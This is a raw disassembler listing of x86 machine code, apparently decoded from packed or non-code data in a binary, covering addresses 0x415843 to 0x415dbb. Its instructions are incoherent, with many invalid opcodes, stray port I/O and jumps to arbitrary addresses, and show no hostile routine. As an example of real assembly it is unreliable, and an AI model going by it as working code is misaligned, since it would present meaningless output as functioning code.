  415843:	65 b4 cd             	gs mov $0xcd,%ah
  415846:	c3                   	ret
  415847:	16                   	push   %ss
  415848:	3b c8                	cmp    %eax,%ecx
  41584a:	ff 37                	push   (%edi)
  41584c:	3c 18                	cmp    $0x18,%al
  41584e:	20 cd                	and    %cl,%ch
  415850:	43                   	inc    %ebx
  415851:	88 a6 b8 54 fc b8    	mov    %ah,-0x4703ab48(%esi)
  415857:	e6 0b                	out    %al,$0xb
  415859:	76 5f                	jbe    0x4158ba
  41585b:	f5                   	cmc
  41585c:	c3                   	ret
  41585d:	01 2e                	add    %ebp,(%esi)
  41585f:	03 f2                	add    %edx,%esi
  415861:	00 e3                	add    %ah,%bl
  415863:	55                   	push   %ebp
  415864:	6f                   	outsl  %ds:(%esi),(%dx)
  415865:	c3                   	ret
  415866:	42                   	inc    %edx
  415867:	08 31                	or     %dh,(%ecx)
  415869:	82 e7 52             	and    $0x52,%bh
  41586c:	d2 cd                	ror    %cl,%ch
  41586e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41586f:	35 31 2c ba 10       	xor    $0x10ba2c31,%eax
  415874:	2c cf                	sub    $0xcf,%al
  415876:	bc ff 5f 0e e4       	mov    $0xe40e5fff,%esp
  41587b:	23 97 23 f9 08 ff    	and    -0xf706dd(%edi),%edx
  415881:	51                   	push   %ecx
  415882:	30 20                	xor    %ah,(%eax)
  415884:	10 22                	adc    %ah,(%edx)
  415886:	10 49 cf             	adc    %cl,-0x31(%ecx)
  415889:	20 c8                	and    %cl,%al
  41588b:	87 72 69             	xchg   %esi,0x69(%edx)
  41588e:	f4                   	hlt
  41588f:	0d f8 89 22 e7       	or     $0xe72289f8,%eax
  415894:	55                   	push   %ebp
  415895:	03 f2                	add    %edx,%esi
  415897:	3d 69 1e 46 64       	cmp    $0x64461e69,%eax
  41589c:	15 ca f8 d6 fe       	adc    $0xfed6f8ca,%eax
  4158a1:	c6                   	(bad)
  4158a2:	60                   	pusha
  4158a3:	79 4e                	jns    0x4158f3
  4158a5:	6c                   	insb   (%dx),%es:(%edi)
  4158a6:	7c 2d                	jl     0x4158d5
  4158a8:	46                   	inc    %esi
  4158a9:	33 db                	xor    %ebx,%ebx
  4158ab:	8d 3e                	lea    (%esi),%edi
  4158ad:	b1 15                	mov    $0x15,%cl
  4158af:	88 08                	mov    %cl,(%eax)
  4158b1:	bd 16 4d e6 db       	mov    $0xdbe64d16,%ebp
  4158b6:	0c 90                	or     $0x90,%al
  4158b8:	9b                   	fwait
  4158b9:	0d 7a ff 44 5a       	or     $0x5a44ff7a,%eax
  4158be:	18 60 6e             	sbb    %ah,0x6e(%eax)
  4158c1:	12 fe                	adc    %dh,%bh
  4158c3:	34 43                	xor    $0x43,%al
  4158c5:	4e                   	dec    %esi
  4158c6:	75 d6                	jne    0x41589e
  4158c8:	18 d1                	sbb    %dl,%cl
  4158ca:	4e                   	dec    %esi
  4158cb:	5e                   	pop    %esi
  4158cc:	cf                   	iret
  4158cd:	49                   	dec    %ecx
  4158ce:	18 c2                	sbb    %al,%dl
  4158d0:	7c 18                	jl     0x4158ea
  4158d2:	35 ee 55 f4 c2       	xor    $0xc2f455ee,%eax
  4158d7:	10 1a                	adc    %bl,(%edx)
  4158d9:	20 13                	and    %dl,(%ebx)
  4158db:	25 36 e2 d5 b9       	and    $0xb9d5e236,%eax
  4158e0:	ad                   	lods   %ds:(%esi),%eax
  4158e1:	d1 15 d1 64 21 73    	rcll   $1,0x732164d1
  4158e7:	c9                   	leave
  4158e8:	03 6b 45             	add    0x45(%ebx),%ebp
  4158eb:	b0 51                	mov    $0x51,%al
  4158ed:	56                   	push   %esi
  4158ee:	fc                   	cld
  4158ef:	92                   	xchg   %eax,%edx
  4158f0:	93                   	xchg   %eax,%ebx
  4158f1:	3d df 3c 95 fc       	cmp    $0xfc953cdf,%eax
  4158f6:	38 86 62 56 a4 e8    	cmp    %al,-0x175ba99e(%esi)
  4158fc:	21 b6 26 7a d0 e7    	and    %esi,-0x182f85da(%esi)
  415902:	5c                   	pop    %esp
  415903:	a2 2e c0 bb 7b       	mov    %al,0x7bbbc02e
  415908:	04 10                	add    $0x10,%al
  41590a:	b2 01                	mov    $0x1,%dl
  41590c:	d4 50                	aam    $0x50
  41590e:	a1 27 4f 2c ff       	mov    0xff2c4f27,%eax
  415913:	17                   	pop    %ss
  415914:	db ff                	(bad)
  415916:	4b                   	dec    %ebx
  415917:	94                   	xchg   %eax,%esp
  415918:	2b 6a 19             	sub    0x19(%edx),%ebp
  41591b:	6d                   	insl   (%dx),%es:(%edi)
  41591c:	d0 d2                	rcl    $1,%dl
  41591e:	18 69 2c             	sbb    %ch,0x2c(%ecx)
  415921:	62 15 d3 00 04 c3    	bound  %edx,0xc30400d3
  415927:	5b                   	pop    %ebx
  415928:	68 7f 46 5b f0       	push   $0xf05b467f
  41592d:	db 89 5d f0 02 1f    	fisttpl 0x1f02f05d(%ecx)
  415933:	f1                   	int1
  415934:	b1 ec                	mov    $0xec,%cl
  415936:	00 f9                	add    %bh,%cl
  415938:	10 5f 74             	adc    %bl,0x74(%edi)
  41593b:	57                   	push   %edi
  41593c:	52                   	push   %edx
  41593d:	15 c3 26 83 90       	adc    $0x908326c3,%eax
  415942:	4d                   	dec    %ebp
  415943:	fc                   	cld
  415944:	b3 2e                	mov    $0x2e,%bl
  415946:	c9                   	leave
  415947:	9b                   	fwait
  415948:	ab                   	stos   %eax,%es:(%edi)
  415949:	14 b3                	adc    $0xb3,%al
  41594b:	19 f0                	sbb    %esi,%eax
  41594d:	8b d6                	mov    %esi,%edx
  41594f:	0c 17                	or     $0x17,%al
  415951:	84 d9                	test   %bl,%cl
  415953:	61                   	popa
  415954:	26 1c 16             	es sbb $0x16,%al
  415957:	70 15                	jo     0x41596e
  415959:	cb                   	lret
  41595a:	f7 dc                	neg    %esp
  41595c:	84 ea                	test   %ch,%dl
  41595e:	49                   	dec    %ecx
  41595f:	18 0c 1c             	sbb    %cl,(%esp,%ebx,1)
  415962:	f8                   	clc
  415963:	48                   	dec    %eax
  415964:	4e                   	dec    %esi
  415965:	c2 24 20             	ret    $0x2024
  415968:	87 59 57             	xchg   %ebx,0x57(%ecx)
  41596b:	61                   	popa
  41596c:	24 7f                	and    $0x7f,%al
  41596e:	1d 7b 57 c6 f0       	sbb    $0xf0c6577b,%eax
  415973:	ba 02 8c 0f 17       	mov    $0x170f8c02,%edx
  415978:	c3                   	ret
  415979:	30 1b                	xor    %bl,(%ebx)
  41597b:	08 07                	or     %al,(%edi)
  41597d:	bf 25 9f 21 02       	mov    $0x2219f25,%edi
  415982:	5b                   	pop    %ebx
  415983:	2c cd                	sub    $0xcd,%al
  415985:	d5 83                	aad    $0x83
  415987:	c0 09 a5             	rorb   $0xa5,(%ecx)
  41598a:	32 35 18 6c 74 1c    	xor    0x1c746c18,%dh
  415990:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  415991:	d7                   	xlat   %ds:(%ebx)
  415992:	01 d5                	add    %edx,%ebp
  415994:	bc 26 23 dc 57       	mov    $0x57dc2326,%esp
  415999:	31 26                	xor    %esp,(%esi)
  41599b:	b4 95                	mov    $0x95,%ah
  41599d:	32 7b a3             	xor    -0x5d(%ebx),%bh
  4159a0:	bc 64 63 90 e8       	mov    $0xe8906364,%esp
  4159a5:	e8 a6 ec bb 58       	call   0x58fd4650
  4159aa:	5b                   	pop    %ebx
  4159ab:	c0 36 24             	shlb   $0x24,(%esi)
  4159ae:	df 10                	fists  (%eax)
  4159b0:	18 f0                	sbb    %dh,%al
  4159b2:	b6 75                	mov    $0x75,%dh
  4159b4:	9a 2d e2 18 96 29 46 	lcall  $0x4629,$0x9618e22d
  4159bb:	75 00                	jne    0x4159bd
  4159bd:	4d                   	dec    %ebp
  4159be:	52                   	push   %edx
  4159bf:	27                   	daa
  4159c0:	61                   	popa
  4159c1:	01 7a f4             	add    %edi,-0xc(%edx)
  4159c4:	34 45                	xor    $0x45,%al
  4159c6:	e8 29 85 e7 8d       	call   0x8e28def4
  4159cb:	3f                   	aas
  4159cc:	83 c0 02             	add    $0x2,%eax
  4159cf:	03 d8                	add    %eax,%ebx
  4159d1:	ff a9 4e 75 df cb    	ljmp   *-0x34208ab2(%ecx)
  4159d7:	c2 c1 3a             	ret    $0x3ac1
  4159da:	e8 51 5a 7a 1b       	call   0x1bbbb430
  4159df:	41                   	inc    %ecx
  4159e0:	45                   	inc    %ebp
  4159e1:	26 e4 92             	es in  $0x92,%al
  4159e4:	40                   	inc    %eax
  4159e5:	ec                   	in     (%dx),%al
  4159e6:	ec                   	in     (%dx),%al
  4159e7:	db 61 a9             	(bad) -0x57(%ecx)
  4159ea:	4a                   	dec    %edx
  4159eb:	4c                   	dec    %esp
  4159ec:	a8 0e                	test   $0xe,%al
  4159ee:	6b 1d cf 63 b7 3f 52 	imul   $0x52,0x3fb763cf,%ebx
  4159f5:	6c                   	insb   (%dx),%es:(%edi)
  4159f6:	03 df                	add    %edi,%ebx
  4159f8:	c6 03 0d             	movb   $0xd,(%ebx)
  4159fb:	43                   	inc    %ebx
  4159fc:	03 0a                	add    (%edx),%ecx
  4159fe:	43                   	inc    %ebx
  4159ff:	58                   	pop    %eax
  415a00:	c8 10 76 e7          	enter  $0x7610,$0xe7
  415a04:	64 e0 c2             	fs loopne 0x4159c9
  415a07:	58                   	pop    %eax
  415a08:	23 4b 6a             	and    0x6a(%ebx),%ecx
  415a0b:	46                   	inc    %esi
  415a0c:	c8 0e 24 25          	enter  $0x240e,$0x25
  415a10:	8b 39                	mov    (%ecx),%edi
  415a12:	59                   	pop    %ecx
  415a13:	e4 65                	in     $0x65,%al
  415a15:	cf                   	iret
  415a16:	ff 52 75             	call   *0x75(%edx)
  415a19:	d8 4b 85             	fmuls  -0x7b(%ebx)
  415a1c:	db 7c 23 43          	fstpt  0x43(%ebx,%eiz,1)
  415a20:	33 f6                	xor    %esi,%esi
  415a22:	d6                   	salc
  415a23:	96                   	xchg   %eax,%esi
  415a24:	2e e2 a1             	loop,pn 0x4159c8
  415a27:	b5 0c                	mov    $0xc,%ch
  415a29:	35 5a e8 5b 9c       	xor    $0x9c5be85a,%eax
  415a2e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  415a2f:	02 f4                	add    %ah,%dh
  415a31:	46                   	inc    %esi
  415a32:	4b                   	dec    %ebx
  415a33:	75 e0                	jne    0x415a15
  415a35:	2f                   	das
  415a36:	51                   	push   %ecx
  415a37:	40                   	inc    %eax
  415a38:	59                   	pop    %ecx
  415a39:	4b                   	dec    %ebx
  415a3a:	48                   	dec    %eax
  415a3b:	af                   	scas   %es:(%edi),%eax
  415a3c:	95                   	xchg   %eax,%ebp
  415a3d:	08 53 7d             	or     %dl,0x7d(%ebx)
  415a40:	a2 dc eb 40 28       	mov    %al,0x2840ebdc
  415a45:	7e 06                	jle    0x415a4d
  415a47:	3d 22 db 57 20       	cmp    $0x2057db22,%eax
  415a4c:	58                   	pop    %eax
  415a4d:	50                   	push   %eax
  415a4e:	0b 08                	or     (%eax),%ecx
  415a50:	35 cd 04 6f 49       	xor    $0x496f04cd,%eax
  415a55:	e3 2f                	jecxz  0x415a86
  415a57:	e7 96                	out    %eax,$0x96
  415a59:	9e                   	sahf
  415a5a:	2a 15 e2 ca a1 f0    	sub    0xf0a1cae2,%dl
  415a60:	6f                   	outsl  %ds:(%esi),(%dx)
  415a61:	1a b7 e0 1c c2 92    	sbb    -0x6d3de320(%edi),%dh
  415a67:	c1 b5 c4 fd 58 86 3c 	shll   $0x3c,-0x79a7023c(%ebp)
  415a6e:	e4 64                	in     $0x64,%al
  415a70:	71 cb                	jno    0x415a3d
  415a72:	59                   	pop    %ecx
  415a73:	20 b8 3d 04 09 1e    	and    %bh,0x1e09043d(%eax)
  415a79:	ec                   	in     (%dx),%al
  415a7a:	90                   	nop
  415a7b:	bb 02 f8 b2 03       	mov    $0x3b2f802,%ebx
  415a80:	e4 24                	in     $0x24,%al
  415a82:	2d 6d 5a 50 15       	sub    $0x15505a6d,%eax
  415a87:	59                   	pop    %ecx
  415a88:	03 8a d5 31 48 08    	add    0x84831d5(%edx),%ecx
  415a8e:	e5 0e                	in     $0xe,%eax
  415a90:	69 f8 08 2b f0 8d    	imul   $0x8df02b08,%eax,%edi
  415a96:	d0 ce                	ror    $1,%dh
  415a98:	55                   	push   %ebp
  415a99:	0b c9                	or     %ecx,%ecx
  415a9b:	38 e9                	cmp    %ch,%cl
  415a9d:	8d                   	lea    (bad),%edi
  415a9e:	f8                   	clc
  415a9f:	13 0a                	adc    (%edx),%ecx
  415aa1:	23 28                	and    (%eax),%ebp
  415aa3:	fd                   	std
  415aa4:	90                   	nop
  415aa5:	87 03                	xchg   %eax,(%ebx)
  415aa7:	c9                   	leave
  415aa8:	57                   	push   %edi
  415aa9:	5a                   	pop    %edx
  415aaa:	74 5a                	je     0x415b06
  415aac:	33 f8                	xor    %eax,%edi
  415aae:	34 2c                	xor    $0x2c,%al
  415ab0:	58                   	pop    %eax
  415ab1:	94                   	xchg   %eax,%esp
  415ab2:	6f                   	outsl  %ds:(%esi),(%dx)
  415ab3:	ab                   	stos   %eax,%es:(%edi)
  415ab4:	0f 39                	(bad)
  415ab6:	20 8d df f8 dc 1d    	and    %cl,0x1ddcf8df(%ebp)
  415abc:	5b                   	pop    %ebx
  415abd:	3b f3                	cmp    %ebx,%esi
  415abf:	e4 92                	in     $0x92,%al
  415ac1:	07                   	pop    %es
  415ac2:	d2 74 64 e0          	shlb   %cl,-0x20(%esp,%eiz,2)
  415ac6:	00 5b f8             	add    %bl,-0x8(%ebx)
  415ac9:	d2 c9                	ror    %cl,%cl
  415acb:	1a 03                	sbb    (%ebx),%al
  415acd:	51                   	push   %ecx
  415ace:	0b 40 57             	or     0x57(%eax),%eax
  415ad1:	ad                   	lods   %ds:(%esi),%eax
  415ad2:	48                   	dec    %eax
  415ad3:	4e                   	dec    %esi
  415ad4:	b6 1b                	mov    $0x1b,%dh
  415ad6:	3e 49                	ds dec %ecx
  415ad8:	48                   	dec    %eax
  415ad9:	af                   	scas   %es:(%edi),%eax
  415ada:	07                   	pop    %es
  415adb:	5b                   	pop    %ebx
  415adc:	4c                   	dec    %esp
  415add:	a8 95                	test   $0x95,%al
  415adf:	1c 24                	sbb    $0x24,%al
  415ae1:	5b                   	pop    %ebx
  415ae2:	20 83 17 23 11 4f    	and    %al,0x4f112317(%ebx)
  415ae8:	e9 2d 07 7b df       	jmp    0xdfbc621a
  415aed:	6c                   	insb   (%dx),%es:(%edi)
  415aee:	d8 6e 0a             	fsubrs 0xa(%esi)
  415af1:	6d                   	insl   (%dx),%es:(%edi)
  415af2:	cd 0b                	int    $0xb
  415af4:	6b 30 8c             	imul   $0xffffff8c,(%eax),%esi
  415af7:	48                   	dec    %eax
  415af8:	15 57 13 04 13       	adc    $0x13041357,%eax
  415afd:	c1 42 9e 68          	roll   $0x68,-0x62(%edx)
  415b01:	5e                   	pop    %esi
  415b02:	e6 f2                	out    %al,$0xf2
  415b04:	1c c8                	sbb    $0xc8,%al
  415b06:	09 ab 5b c6 64 0d    	or     %ebp,0xd64c65b(%ebx)
  415b0c:	e1 4a                	loope  0x415b58
  415b0e:	4e                   	dec    %esi
  415b0f:	b2 5b                	mov    $0x5b,%dl
  415b11:	5e                   	pop    %esi
  415b12:	3b 90 5f 87 70 27    	cmp    0x2770875f(%eax),%edx
  415b18:	a2 2a 05 5c eb       	mov    %al,0xeb5c052a
  415b1d:	8b 35 8d 64 c8 59    	mov    0x59c8648d,%esi
  415b23:	74 70                	je     0x415b95
  415b25:	2f                   	das
  415b26:	0c 6a                	or     $0x6a,%al
  415b28:	25 27 0c 5c f3       	and    $0xf35c0c27,%eax
  415b2d:	2e 19 b2 17 03 5f 5b 	sbb    %esi,%cs:0x5b5f0317(%edx)
  415b34:	45                   	inc    %ebp
  415b35:	93                   	xchg   %eax,%ebx
  415b36:	5d                   	pop    %ebp
  415b37:	c6                   	(bad)
  415b38:	5b                   	pop    %ebx
  415b39:	d6                   	salc
  415b3a:	57                   	push   %edi
  415b3b:	96                   	xchg   %eax,%esi
  415b3c:	28 55 62             	sub    %dl,0x62(%ebp)
  415b3f:	18 c3                	sbb    %al,%bl
  415b41:	18 21                	sbb    %ah,(%ecx)
  415b43:	97                   	xchg   %eax,%edi
  415b44:	96                   	xchg   %eax,%esi
  415b45:	6e                   	outsb  %ds:(%esi),(%dx)
  415b46:	54                   	push   %esp
  415b47:	4a                   	dec    %edx
  415b48:	5e                   	pop    %esi
  415b49:	1c 5d                	sbb    $0x5d,%al
  415b4b:	6b ff 5c             	imul   $0x5c,%edi,%edi
  415b4e:	17                   	pop    %ss
  415b4f:	e2 41                	loop   0x415b92
  415b51:	40                   	inc    %eax
  415b52:	73 cf                	jae    0x415b23
  415b54:	40                   	inc    %eax
  415b55:	eb f6                	jmp    0x415b4d
  415b57:	97                   	xchg   %eax,%edi
  415b58:	e0 b7                	loopne 0x415b11
  415b5a:	39 6c eb 01          	cmp    %ebp,0x1(%ebx,%ebp,8)
  415b5e:	43                   	inc    %ebx
  415b5f:	8a 13                	mov    (%ebx),%dl
  415b61:	c6                   	(bad)
  415b62:	0a 80 ea 0a 74 05    	or     0x5740aea(%eax),%al
  415b68:	04 8c                	add    $0x8c,%al
  415b6a:	8d b8 f5 03 75 ef    	lea    -0x108afc0b(%eax),%edi
  415b70:	75 2b                	jne    0x415b9d
  415b72:	c8 57 92 a8          	enter  $0x9257,$0xa8
  415b76:	d9 da                	(bad)
  415b78:	9f                   	lahf
  415b79:	90                   	nop
  415b7a:	fb                   	sti
  415b7b:	30 80 3b 0d 75 2d    	xor    %al,0x2d750d3b(%eax)
  415b81:	05 0a e4 24 6c       	add    $0x6c24e40a,%eax
  415b86:	10 5f c2             	adc    %bl,-0x3e(%edi)
  415b89:	fe 06                	incb   (%esi)
  415b8b:	5d                   	pop    %ebp
  415b8c:	44                   	inc    %esp
  415b8d:	58                   	pop    %eax
  415b8e:	c9                   	leave
  415b8f:	81 23 5d fc 4d d5    	andl   $0xd54dfc5d,(%ebx)
  415b95:	b2 38                	mov    $0x38,%dl
  415b97:	13 5b 55             	adc    0x55(%ebx),%ebx
  415b9a:	46                   	inc    %esi
  415b9b:	cb                   	lret
  415b9c:	62 f9 b6             	(bad) {rn-bad}
  415b9f:	18 02                	sbb    %al,(%edx)
  415ba1:	1c 07                	sbb    $0x7,%al
  415ba3:	20 24 6b             	and    %ah,(%ebx,%ebp,2)
  415ba6:	46                   	inc    %esi
  415ba7:	43                   	inc    %ebx
  415ba8:	53                   	push   %ebx
  415ba9:	f1                   	int1
  415baa:	44                   	inc    %esp
  415bab:	cc                   	int3
  415bac:	8b 46 24             	mov    0x24(%esi),%eax
  415baf:	10 76 46             	adc    %dh,0x46(%esi)
  415bb2:	98                   	cwtl
  415bb3:	d0 be 19 f0 15 e8    	sarb   $1,-0x17ea0fe7(%esi)
  415bb9:	50                   	push   %eax
  415bba:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  415bbb:	2a 0c df             	sub    (%edi,%ebx,8),%cl
  415bbe:	87 58 58             	xchg   %ebx,0x58(%eax)
  415bc1:	9c                   	pushf
  415bc2:	e2 24                	loop   0x415be8
  415bc4:	90                   	nop
  415bc5:	5f                   	pop    %edi
  415bc6:	7f 6b                	jg     0x415c33
  415bc8:	9f                   	lahf
  415bc9:	a8 51                	test   $0x51,%al
  415bcb:	cd 7b                	int    $0x7b
  415bcd:	14 ac                	adc    $0xac,%al
  415bcf:	36 43                	ss inc %ebx
  415bd1:	0c 89                	or     $0x89,%al
  415bd3:	04 24                	add    $0x24,%al
  415bd5:	eb f1                	jmp    0x415bc8
  415bd7:	10 27                	adc    %ah,(%edi)
  415bd9:	82 2a 17             	subb   $0x17,(%edx)
  415bdc:	18 74 a5 e8          	sbb    %dh,-0x18(%ebp,%eiz,4)
  415be0:	ff 37                	push   (%edi)
  415be2:	99                   	cltd
  415be3:	1b 8a 43 15 2c 01    	sbb    0x12c1543(%edx),%ecx
  415be9:	72 20                	jb     0x415c0b
  415beb:	fe c8                	dec    %al
  415bed:	74 02                	je     0x415bf1
  415bef:	eb 0e                	jmp    0x415bff
  415bf1:	39 88 6d fa be e4    	cmp    %ecx,-0x1b410593(%eax)
  415bf7:	ca c3 c9             	lret   $0xc9c3
  415bfa:	90                   	nop
  415bfb:	a0 14 24 0b 79       	mov    0x790b2414,%al
  415c00:	28 48 d1             	sub    %cl,-0x2f(%eax)
  415c03:	3e c7                	ds (bad)
  415c05:	1b 10                	sbb    (%eax),%edx
  415c07:	2a f5                	sub    %ch,%dh
  415c09:	9f                   	lahf
  415c0a:	94                   	xchg   %eax,%esp
  415c0b:	f8                   	clc
  415c0c:	20 64 75 70          	and    %ah,0x70(%ebp,%esi,2)
  415c10:	6c                   	insb   (%dx),%es:(%edi)
  415c11:	69 63 22 21 46 e2 01 	imul   $0x1e24621,0x22(%ebx),%esp
  415c18:	c3                   	ret
  415c19:	53                   	push   %ebx
  415c1a:	75 11                	jne    0x415c2d
  415c1c:	a1 6a 88 2e 6a       	mov    0x6a2e886a,%eax
  415c21:	1a 37                	sbb    (%edi),%dh
  415c23:	d8 9e 1c 92 91 17    	fcomps 0x1791921c(%esi)
  415c29:	db 9d 18 8b 1b 22    	fistpl 0x221b8b18(%ebp)
  415c2f:	b6 43                	mov    $0x43,%dh
  415c31:	a2 6b 24 b9 5b       	mov    %al,0x5bb9246b
  415c36:	c7                   	(bad)
  415c37:	0c 16                	or     $0x16,%al
  415c39:	2d c2 6e ed 84       	sub    $0x84ed6ec2,%eax
  415c3e:	39 70 19             	cmp    %esi,0x19(%eax)
  415c41:	ac                   	lods   %ds:(%esi),%al
  415c42:	4b                   	dec    %ebx
  415c43:	0c e6                	or     $0xe6,%al
  415c45:	40                   	inc    %eax
  415c46:	67 91                	addr16 xchg %eax,%ecx
  415c48:	e7 43                	out    %eax,$0x43
  415c4a:	c3                   	ret
  415c4b:	25 6c 12 41 83       	and    $0x8341126c,%eax
  415c50:	21 27                	and    %esp,(%edi)
  415c52:	11 97 b2 a5 3a aa    	adc    %edx,-0x55c55a4e(%edi)
  415c58:	84 ce                	test   %cl,%dh
  415c5a:	3e 5e                	ds pop %esi
  415c5c:	bc 6b 93 3c d9       	mov    $0xd93c936b,%esp
  415c61:	4b                   	dec    %ebx
  415c62:	8d 04 f0             	lea    (%eax,%esi,8),%eax
  415c65:	31 f6                	xor    %esi,%esi
  415c67:	59                   	pop    %ecx
  415c68:	2f                   	das
  415c69:	5c                   	pop    %esp
  415c6a:	a8 9a                	test   $0x9a,%al
  415c6c:	4c                   	dec    %esp
  415c6d:	d4 19                	aam    $0x19
  415c6f:	2b 35 c8 c1 e1 2c    	sub    0x2ce1c1c8,%esi
  415c75:	06                   	push   %es
  415c76:	7f bf                	jg     0x415c37
  415c78:	03 21                	add    (%ecx),%esp
  415c7a:	14 f0                	adc    $0xf0,%al
  415c7c:	05 44 f0 08 2f       	add    $0x2f08f044,%eax
  415c81:	60                   	pusha
  415c82:	af                   	scas   %es:(%edi),%eax
  415c83:	86 35 17 ed 0d ef    	xchg   %dh,0xef0ded17
  415c89:	e2 28                	loop   0x415cb3
  415c8b:	36 a3 b7 20 f1 64    	mov    %eax,%ss:0x64f120b7
  415c91:	65 78 f7             	gs js  0x415c8b
  415c94:	ef                   	out    %eax,(%dx)
  415c95:	41                   	inc    %ecx
  415c96:	92                   	xchg   %eax,%edx
  415c97:	47                   	inc    %edi
  415c98:	76 cb                	jbe    0x415c65
  415c9a:	82 44 5f 46 76       	addb   $0x76,0x46(%edi,%ebx,2)
  415c9f:	9e                   	sahf
  415ca0:	ae                   	scas   %es:(%edi),%al
  415ca1:	87 16                	xchg   %edx,(%esi)
  415ca3:	7b cf                	jnp    0x415c74
  415ca5:	99                   	cltd
  415ca6:	43                   	inc    %ebx
  415ca7:	90                   	nop
  415ca8:	5d                   	pop    %ebp
  415ca9:	84 f9                	test   %bh,%cl
  415cab:	70 4f                	jo     0x415cfc
  415cad:	54                   	push   %esp
  415cae:	5f                   	pop    %edi
  415caf:	db 72 27             	(bad) 0x27(%edx)
  415cb2:	b2 6f                	mov    $0x6f,%dl
  415cb4:	8b 58 aa             	mov    -0x56(%eax),%ebx
  415cb7:	8a 40 d2             	mov    -0x2e(%eax),%al
  415cba:	00 1b                	add    %bl,(%ebx)
  415cbc:	85 86 08 44 2c 1a    	test   %eax,0x1a2c4408(%esi)
  415cc2:	40                   	inc    %eax
  415cc3:	b4 0a                	mov    $0xa,%ah
  415cc5:	4a                   	dec    %edx
  415cc6:	4a                   	dec    %edx
  415cc7:	72 28                	jb     0x415cf1
  415cc9:	78 b1                	js     0x415c7c
  415ccb:	2d 20 5a 02 48       	sub    $0x48025a20,%eax
  415cd0:	fb                   	sti
  415cd1:	45                   	inc    %ebp
  415cd2:	5b                   	pop    %ebx
  415cd3:	f1                   	int1
  415cd4:	c2 6f e8             	ret    $0xe86f
  415cd7:	c6                   	(bad)
  415cd8:	30 00                	xor    %al,(%eax)
  415cda:	e8 df aa 2e 12       	call   0x127007be
  415cdf:	7d 0c                	jge    0x415ced
  415ce1:	de 7c 34 8d          	fidivrs -0x73(%esp,%esi,1)
  415ce5:	1c 37                	sbb    $0x37,%al
  415ce7:	d1 eb                	shr    $1,%ebx
  415ce9:	30 30                	xor    %dh,(%eax)
  415ceb:	2c 14                	sub    $0x14,%al
  415ced:	44                   	inc    %esp
  415cee:	ce                   	into
  415cef:	d8 db                	fcomp  %st(3)
  415cf1:	95                   	xchg   %eax,%ebp
  415cf2:	db 8a 5b 7f 7d 05    	fisttpl 0x57d7f5b(%edx)
  415cf8:	8d 73 01             	lea    0x1(%ebx),%esi
  415cfb:	eb 77                	jmp    0x415d74
  415cfd:	fb                   	sti
  415cfe:	4f                   	dec    %edi
  415cff:	80 0d 31 0a 6e 37 fe 	orb    $0xfe,0x376e0a31
  415d06:	01 80 7d 15 01 10    	add    %eax,0x1001157d(%eax)
  415d0c:	8b f3                	mov    %ebx,%esi
  415d0e:	33 7d cc             	xor    -0x34(%ebp),%edi
  415d11:	42                   	inc    %edx
  415d12:	0a 28                	or     (%eax),%ch
  415d14:	3f                   	aas
  415d15:	97                   	xchg   %eax,%edi
  415d16:	30 8a 77 80 cb 4e    	xor    %cl,0x4ecb8077(%edx)
  415d1c:	d9 fb                	fsincos
  415d1e:	20 60 e4             	and    %ah,-0x1c(%eax)
  415d21:	c7                   	(bad)
  415d22:	70 48                	jo     0x415d6c
  415d24:	c1 86 03 14 f2 eb 00 	roll   $0x0,-0x140debfd(%esi)
  415d2b:	61                   	popa
  415d2c:	17                   	pop    %ss
  415d2d:	6d                   	insl   (%dx),%es:(%edi)
  415d2e:	91                   	xchg   %eax,%ecx
  415d2f:	4b                   	dec    %ebx
  415d30:	d4 ad                	aam    $0xad
  415d32:	40                   	inc    %eax
  415d33:	0c d3                	or     $0xd3,%al
  415d35:	d2 b0 6c 00 6c 54    	shlb   %cl,0x546c006c(%eax)
  415d3b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  415d3c:	8b fe                	mov    %esi,%edi
  415d3e:	36 c8 de 04 4d       	ss enter $0x4de,$0x4d
  415d43:	4b                   	dec    %ebx
  415d44:	42                   	inc    %edx
  415d45:	50                   	push   %eax
  415d46:	10 83 fa 40 7e c6    	adc    %al,-0x3981bf06(%ebx)
  415d4c:	8e 6a db             	mov    -0x25(%edx),%gs
  415d4f:	3d f2 48 79 0a       	cmp    $0xa7948f2,%eax
  415d54:	c1 fe dc             	sar    $0xdc,%esi
  415d57:	00 7f 4b             	add    %bh,0x4b(%edi)
  415d5a:	db 11                	fistl  (%ecx)
  415d5c:	12 08                	adc    (%eax),%cl
  415d5e:	1f                   	pop    %ds
  415d5f:	be 34 eb 05 be       	mov    $0xbe05eb34,%esi
  415d64:	e9 30 c6 d6 25       	jmp    0x26182399
  415d69:	03 69 d6             	add    -0x2a(%ecx),%ebp
  415d6c:	51                   	push   %ecx
  415d6d:	5e                   	pop    %esi
  415d6e:	37                   	aaa
  415d6f:	2a f2                	sub    %dl,%dh
  415d71:	74 10                	je     0x415d83
  415d73:	2e 0e                	cs push %cs
  415d75:	98                   	cwtl
  415d76:	48                   	dec    %eax
  415d77:	c8 30 16 30          	enter  $0x1630,$0x30
  415d7b:	c8 74 62 67          	enter  $0x6274,$0x67
  415d7f:	30 d8                	xor    %bl,%al
  415d81:	d3 97 04 37 88 07    	rcll   %cl,0x7883704(%edi)
  415d87:	39 74 40 f9          	cmp    %esi,-0x7(%eax,%eax,2)
  415d8b:	9c                   	pushf
  415d8c:	2d e3 38 61 00       	sub    $0x6138e3,%eax
  415d91:	c6                   	(bad)
  415d92:	7e 54                	jle    0x415de8
  415d94:	61                   	popa
  415d95:	c3                   	ret
  415d96:	9e                   	sahf
  415d97:	26 2c f9             	es sub $0xf9,%al
  415d9a:	56                   	push   %esi
  415d9b:	5f                   	pop    %edi
  415d9c:	cb                   	lret
  415d9d:	f6 5e 6a             	negb   0x6a(%esi)
  415da0:	87 11                	xchg   %edx,(%ecx)
  415da2:	df be 48 64 20 6c    	fistpll 0x6c206448(%esi)
  415da8:	d2 cc                	ror    %cl,%ah
  415daa:	92                   	xchg   %eax,%edx
  415dab:	11 02                	adc    %eax,(%edx)
  415dad:	63 7f eb             	arpl   %edi,-0x15(%edi)
  415db0:	e3 d8                	jecxz  0x415d8a
  415db2:	06                   	push   %es
  415db3:	35 d7 33 07 5b       	xor    $0x5b0733d7,%eax
  415db8:	50                   	push   %eax
  415db9:	7c e6                	jl     0x415da1
  415dbb:	b8 99 6e 38 18       	mov    $0x18386e99,%eax
